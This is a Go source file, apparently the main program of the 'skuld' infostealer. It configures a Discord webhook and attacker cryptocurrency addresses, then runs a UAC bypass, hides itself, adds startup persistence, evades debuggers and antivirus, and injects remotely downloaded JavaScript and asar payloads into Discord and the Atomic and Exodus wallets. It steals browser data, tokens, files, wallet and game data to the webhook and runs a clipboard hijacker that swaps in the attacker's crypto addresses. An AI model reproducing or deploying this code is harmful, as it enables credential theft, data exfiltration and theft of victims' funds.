package main

import (
	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discordapp.com/api/webhooks/1167754146858942464/Z-6CmWpdc87E14TnSuL3esRv3PRhHg5TrjqBMJJFBAdtSTNn0IBNcK-GKwhaDfsz05Nv",
		"cryptos": map[string]string{
			"BTC":  "bc1qr7sh440a4p4qxmc383wxk3tkl4xvv4u5qdxe0c",
			"ETH":  "0x78ED9A79f1f28ffd4396647787247162feE0366F",
			"MON":  "one1vtwwsrs0ep3tk79lpaafsm482ga3el9ga4mkyr",
			"LTC":  "ltc1qtw7qlf2nr3hv4jgc3pdl6ne7a6r6et6cx88tuu",
			"XCH":  "",
			"PCH":  "0x78ED9A79f1f28ffd4396647787247162feE0366F",
			"CCH":  "",
			"ADA":  "addr1q87g9tduu92uk250as44fu6nzv8uamwpksh6gum5xnypcdgasty6r5qgd27ps7wxkhadz3f0e2wjuuqx6ncf4d6qnxes82mnfa",
			"DASH": "XcZG8oMFbNbSWNnYLY5tNC6jhVLaKgSi9i",
		},
	}
	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		startup.Run()
	}
	antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/atomic.asar",
		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
